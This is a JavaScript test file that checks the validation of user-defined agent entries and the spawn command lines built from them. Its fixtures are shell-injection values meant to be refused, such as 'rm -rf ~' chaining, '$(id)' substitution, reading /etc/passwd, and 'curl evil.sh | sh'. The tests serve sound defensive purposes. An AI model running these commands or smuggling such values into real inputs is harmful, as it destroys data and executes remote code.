// Pins custom-agents.js + the custom half of buildAgentSpawnFrom — the user
// consent half of the spawn allowlist. The invariant under test is the same
// one agent-spawn.test.js pins for built-ins, seen from the store side:
// main re-vets every custom entry on every read, and what survives vetting
// is inert by construction (a bare bin resolved via PATH, args that are
// single literal tokens), so a poisoned 'custom-agents' store degrades to
// "fewer kinds in the ＋ menu" and can never become a command line. The
// tests that matter are the refusals.
import { describe, it, expect } from 'vitest'
import { vetCustomAgent, mergeAgents } from '../src/main/lib/custom-agents.js'
import { buildAgentSpawn, buildAgentSpawnFrom } from '../src/main/lib/agent-spawn.js'
import { AGENT_MODELS } from '../src/shared/agent-models.js'
import { AGENTS } from '../src/shared/pane-kinds.js'

// Same warning-capture helper as agent-spawn.test.js: a dropped model pin
// warns, and the warning is the user's only trace of it.
function captureWarnings(fn) {
  const seen = []
  const real = console.warn
  console.warn = (...args) => seen.push(args.join(' '))
  try {
    return { result: fn(), warned: seen.join('\n') }
  } finally {
    console.warn = real
  }
}

const AIDER = { id: 'aider', label: 'Aider', bin: 'aider' }

describe('vetCustomAgent — accepts', () => {
  it('a minimal entry', () => {
    const { ok, agent } = vetCustomAgent(AIDER)
    expect(ok).toBe(true)
    expect(agent).toEqual({ id: 'aider', label: 'Aider', bin: 'aider' })
  })

  it('an entry with args and a model flag, and returns a fresh object', () => {
    const raw = { id: 'codex', label: 'Codex CLI', bin: 'codex', args: ['--full-auto', '-q'], modelFlag: '--model' }
    const { ok, agent } = vetCustomAgent(raw)
    expect(ok).toBe(true)
    expect(agent).toEqual({ id: 'codex', label: 'Codex CLI', bin: 'codex', args: ['--full-auto', '-q'], modelFlag: '--model' })
    // The vetted copy shares nothing with the caller's object — mutating
    // the raw entry afterwards must not reach whatever main already took.
    raw.args.push('; rm -rf ~')
    expect(agent.args).toEqual(['--full-auto', '-q'])
  })

  it('drops an empty args array rather than carrying it', () => {
    const { ok, agent } = vetCustomAgent({ ...AIDER, args: [] })
    expect(ok).toBe(true)
    expect(agent).not.toHaveProperty('args')
  })

  it('accepts bins with dots/underscores/dashes and upper case (PATH names)', () => {
    for (const bin of ['claude-code', 'my_cli', 'GPT-4.sh', 'aider.chat']) {
      expect(vetCustomAgent({ ...AIDER, bin }).ok).toBe(true)
    }
  })
})

describe('vetCustomAgent — id rules', () => {
  it.each([
    'claude', // built-in agent
    'opencode',
    'pi',
    'terminal', // reserved non-agent kinds
    'chat',
    'brain',
    'flow',
    'runs',
    'doc',
    'editor',
    'events',
  ])('refuses the reserved id %j', (id) => {
    const { ok, error } = vetCustomAgent({ ...AIDER, id })
    expect(ok).toBe(false)
    expect(error).toContain('built-in')
  })

  it.each(['Aider', 'aider_cli', '-aider', 'aider ', '', 'a'.repeat(33), 'aidér'])(
    'refuses the malformed id %j',
    (id) => {
      expect(vetCustomAgent({ ...AIDER, id }).ok).toBe(false)
    }
  )

  it('accepts a 32-char id and refuses 33', () => {
    expect(vetCustomAgent({ ...AIDER, id: 'a'.repeat(32) }).ok).toBe(true)
    expect(vetCustomAgent({ ...AIDER, id: 'a'.repeat(33) }).ok).toBe(false)
  })
})

describe('vetCustomAgent — label rules', () => {
  it.each(['', 'x'.repeat(41), 'a\tb', 'a\nb', 'café'])('refuses label %j', (label) => {
    expect(vetCustomAgent({ ...AIDER, label }).ok).toBe(false)
  })
  it('accepts 40 chars of printable ASCII', () => {
    expect(vetCustomAgent({ ...AIDER, label: 'x'.repeat(40) }).ok).toBe(true)
  })
})

describe('vetCustomAgent — bin rules', () => {
  it.each([
    '/usr/local/bin/aider', // absolute path — resolution is PATH's job
    '../bin/aider', // traversal
    'bin/aider', // any separator at all
    'aider\\cli',
    'aider;rm', // separators are the only chars the regex must keep out…
    'aider rm', // …but a space would become two tokens on the command line
    'aider$HOME',
    '',
    '-aider', // must not start with a flag dash
    'x'.repeat(65),
  ])('refuses bin %j', (bin) => {
    expect(vetCustomAgent({ ...AIDER, bin }).ok).toBe(false)
  })
})

describe('vetCustomAgent — args rules', () => {
  // These tokens ride into the same `zsh -l -c` line the built-ins run on,
  // so every one of these refusals is a shell injection that dies at the
  // door rather than at the spawn.
  it.each([
    '--yes;rm -rf ~', // chaining
    '--foo|sh', // pipe
    '--foo&rm', // backgrounding
    '$(id)', // substitution
    '`id`',
    '--out>/tmp/x', // redirect
    '--in</etc/passwd',
    "--model='x'", // quoting out of being one token
    '--say "hi"',
    '--esc\\ape', // backslash — escape attempts stay literal
    'two words', // embedded space — single tokens only
    'tab\ttoken', // control chars
    'new\nline',
    '', // empty is not a token
    'x'.repeat(65),
  ])('refuses arg %j', (arg) => {
    const { ok, error } = vetCustomAgent({ ...AIDER, args: [arg] })
    expect(ok).toBe(false)
    expect(error).toContain('args')
  })

  it('refuses more than 8 args', () => {
    expect(vetCustomAgent({ ...AIDER, args: Array(9).fill('-q') }).ok).toBe(false)
    expect(vetCustomAgent({ ...AIDER, args: Array(8).fill('-q') }).ok).toBe(true)
  })

  it('refuses a non-array args', () => {
    expect(vetCustomAgent({ ...AIDER, args: '--full-auto' }).ok).toBe(false)
  })
})

describe('vetCustomAgent — modelFlag rules', () => {
  it.each(['--model', '--mdl', '--use-model'])('accepts %j', (modelFlag) => {
    expect(vetCustomAgent({ ...AIDER, modelFlag }).ok).toBe(true)
  })
  // '---model' passes the letter rule (the third dash matches the [a-z-]
  // class): the guard's job is keeping the token inert on the command line,
  // not policing taste, and an all-dashes token is.
  it.each(['-m', '--Model', '--model=x', '--model ', '--m', '--' + 'm'.repeat(21)])(
    'refuses %j',
    (modelFlag) => {
      expect(vetCustomAgent({ ...AIDER, modelFlag }).ok).toBe(false)
    }
  )
})

describe('vetCustomAgent — shape rules', () => {
  it.each([null, undefined, 'aider', 42, []])('refuses a non-object entry %j', (raw) => {
    expect(vetCustomAgent(raw).ok).toBe(false)
  })
  it('strips fields it did not vet', () => {
    // A store entry carrying extra keys (an older build, a hand edit) must
    // not smuggle them into the merged list — the vetted agent holds only
    // the fields this function checked.
    const { ok, agent } = vetCustomAgent({ ...AIDER, cmd: 'rm -rf ~', env: { PATH: '' }, __proto__: {} })
    expect(ok).toBe(true)
    expect(Object.keys(agent).sort()).toEqual(['bin', 'id', 'label'])
  })
})

describe('mergeAgents', () => {
  it('normalizes built-ins and appends vetted customs', () => {
    const merged = mergeAgents(AGENTS, [AIDER])
    expect(merged).toEqual([
      ...AGENTS.map((name) => ({ id: name, bin: name, custom: false })),
      { ...AIDER, custom: true },
    ])
  })

  it('drops entries that fail vetting instead of throwing', () => {
    // The store is user-editable JSON; "fewer agents than the file lists"
    // is the correct failure mode, not a broken spawn path.
    const merged = mergeAgents(AGENTS, [AIDER, { id: 'evil', label: 'Evil', bin: '/bin/sh' }, null, 'nope'])
    expect(merged.filter((a) => a.custom)).toEqual([{ ...AIDER, custom: true }])
  })

  it('keeps the first of duplicate custom ids — a later dupe can never shadow', () => {
    const first = { id: 'aider', label: 'Aider', bin: 'aider' }
    const second = { id: 'aider', label: 'Impostor', bin: 'impostor' }
    const merged = mergeAgents(AGENTS, [first, second])
    expect(merged.filter((a) => a.custom)).toEqual([{ ...first, custom: true }])
  })

  it('treats a non-array customs argument as empty', () => {
    for (const customs of [null, undefined, 'aider', 42, {}]) {
      expect(mergeAgents(AGENTS, customs)).toEqual(AGENTS.map((name) => ({ id: name, bin: name, custom: false })))
    }
  })

  it('cannot grow a custom that shadows a built-in, even raw', () => {
    // vetCustomAgent refuses reserved ids, so a hand-edited store entry
    // claiming to BE claude is dropped — it never reaches the merged list
    // where it would shadow the real one.
    const merged = mergeAgents(AGENTS, [{ id: 'claude', label: 'Not Claude', bin: 'evil' }])
    expect(merged.filter((a) => a.id === 'claude')).toEqual([{ id: 'claude', bin: 'claude', custom: false }])
  })
})

describe('buildAgentSpawnFrom — customs', () => {
  const list = mergeAgents(AGENTS, [
    AIDER,
    { id: 'codex', label: 'Codex CLI', bin: 'codex', args: ['--full-auto'], modelFlag: '--model' },
  ])

  it('builds the bare bin for a custom without args', () => {
    expect(buildAgentSpawnFrom(list, 'aider')).toBe('aider')
  })

  it('joins bin + vetted args into the command line', () => {
    expect(buildAgentSpawnFrom(list, 'codex')).toBe('codex --full-auto')
  })

  it('returns null for an unknown kind', () => {
    expect(buildAgentSpawnFrom(list, 'gpt')).toBe(null)
    expect(buildAgentSpawnFrom(list, 'terminal')).toBe(null)
  })

  it('returns null for a non-array list', () => {
    expect(buildAgentSpawnFrom(null, 'aider')).toBe(null)
    expect(buildAgentSpawnFrom(undefined, 'aider')).toBe(null)
  })

  it('honors a model pin only when the custom declared a flag AND the alias is allowlisted', () => {
    // Customs start with empty model lists (agent-models.js has no 'codex'
    // entry) — same posture as opencode/pi — so even a declared flag gets no
    // pin until the shared allowlist learns aliases for the kind.
    const { result, warned } = captureWarnings(() => buildAgentSpawnFrom(list, 'codex', { model: 'gpt-5' }))
    expect(result).toBe('codex --full-auto')
    expect(warned).toContain('gpt-5')
  })

  it('drops a pin for a custom with no modelFlag, warning rather than guessing one', () => {
    const { result, warned } = captureWarnings(() => buildAgentSpawnFrom(list, 'aider', { model: 'haiku' }))
    expect(result).toBe('aider')
    expect(warned).toContain('no model flag')
  })

  it('uses the custom flag spelling when an alias IS allowlisted for the kind', () => {
    // Simulate the allowlist learning about a custom kind; the pin must
    // ride the custom's own flag, not the built-in --model constant…
    AGENT_MODELS.codex = { models: ['gpt-5'] }
    try {
      expect(buildAgentSpawnFrom(list, 'codex', { model: 'gpt-5' })).toBe('codex --full-auto --model gpt-5')
    } finally {
      delete AGENT_MODELS.codex
    }
  })
})

describe('buildAgentSpawn — the built-in wrapper is untouched by customs', () => {
  it('still builds built-ins exactly as before', () => {
    expect(buildAgentSpawn('claude', { model: 'haiku' })).toBe('claude --model haiku')
    expect(buildAgentSpawn('opencode')).toBe('opencode')
  })

  it('does not know about custom kinds — only the merged-list form does', () => {
    // The wrapper exists so pre-customs callers keep their semantics: a
    // caller that never merged the store must not spawn store-defined kinds.
    expect(buildAgentSpawn('aider')).toBe(null)
  })

  it('the SAFE_MODEL invariant still holds for built-ins reached through the merged list', () => {
    const list = mergeAgents(AGENTS, [AIDER])
    const poisoned = 'haiku; curl evil.sh | sh'
    AGENT_MODELS.claude.models.push(poisoned)
    try {
      const { result, warned } = captureWarnings(() => buildAgentSpawnFrom(list, 'claude', { model: poisoned }))
      expect(result).toBe('claude')
      expect(warned).toContain(poisoned)
    } finally {
      AGENT_MODELS.claude.models.pop()
    }
  })
})
